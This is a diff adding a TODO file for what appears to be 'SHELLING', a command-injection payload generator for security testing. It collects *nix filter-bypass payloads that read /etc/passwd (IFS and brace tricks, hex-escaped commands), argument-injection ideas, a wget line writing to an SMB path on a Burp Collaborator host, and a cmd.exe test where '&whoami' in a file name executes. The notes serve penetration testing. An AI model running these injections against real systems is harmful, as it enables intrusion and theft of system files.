@@ -1,0 +1,60 @@
+SHELLING TODO
+--------------------------------
+
+TODO for the next release:
+- consider/test the double-separator idea (at least add it as an option)
+- make sure we do quotes right (e.g. check against https://www.exploit-db.com/exploits/39767)
+- better form of best effort payloads
+- payload number recalculation function for each config change, to update the "Save CNT payloads" tab title (so we'll know in advance how many payloads will be produced with the current confgiruation
+Also, we can compare the counter with the actual size to check for duplicates/skipped paylaods
+- go through ENTIRE Daniel's research 
+- response-based analysis as an additional feedback channel (for Scanner) and argument injection
+- make sure there are no invalid payloads in the payload set
+
+OS-specific improvements:
+	- nix: https://security.szurek.pl/exploit-bypass-php-escapeshellarg-escapeshellcmd.html#known-bypassesexploits
+	- nix: Introduce this IFS=,;`cat<<<uname,-a` by https://twitter.com/MrHappiey
+	- nix: reiterate through  (thanks to https://twitter.com/omespino/status/1001484143426002944)
+	- nix: AND https://gtfobins.github.io/gtfobins/tar/ and the like (for known injections, there's plenty of them as it turns out - a manageable list with predefined values would be better
+IFS=,;`cat<<<cat,/etc/passwd`
+cat$IFS/etc/passwd
+cat${IFS}/etc/passwd
+cat</etc/passwd                 
+{cat,/etc/passwd} OR {ls,-las,/var} with args
+X=$'cat\x20/etc/passwd'&&$X
+	- nix: -exec, -e, -r and other argument injections for direct code execution are encouraged ;]
+	- nix: -o, -O and -out are also good outputfile candidates in nix, the problem is we don't have UNC support... or do we? what about URLs to other protocols, like scp:// and the like?
+		we have to figure out something like:
+		wget http://wp.pl -O smb://fdwi7155tpq9htil8kigfkgfh6nwbl.burpcollaborator.net/share/public/file.txt
+		
+	- nix: also, consider injections into sh expressions (?)
+	- nix: how about response-based detection of argument injection by injecting wildcard chars (?*[])?
+	- nix + win envirables inspirations from CONFidence
+
+	- win: the windows argument injection pattern /c "command" I "figured out" after reading the recently released reference
+	- win: additional argument separators for windows: ;-_,=/ (find out compatible commands, as echo/type are fine, while ping fails)
+	- win: check that obfuscation trick from Daniel's presentation (and prolly do more research on the subject)
+	
+	- win: 
+	C:\Users\win>echo aaa > 'test&whoami'
+'whoami'' is not recognized as an internal or external command,
+operable program or batch file.
+WHAT?!?!?!! :DDD
+Apparently in cmd.exe & used in filenames has priority over quotes:
+
+C:\Users\win\Desktop\testy>type HELLO  > 'test&whoami'
+The system cannot find the file specified.
+'whoami'' is not recognized as an internal or external command,
+operable program or batch file.
+
+C:\Users\win\Desktop\testy>dir
+ Volume in drive C has no label.
+ Volume Serial Number is 0CD5-6659
+
+ Directory of C:\Users\win\Desktop\testy
+
+06/17/2018  12:35 AM    <DIR>          .
+06/17/2018  12:35 AM    <DIR>          ..
+06/17/2018  12:35 AM                 0 'test
+               1 File(s)              0 bytes
+               2 Dir(s)   6,749,995,008 bytes free
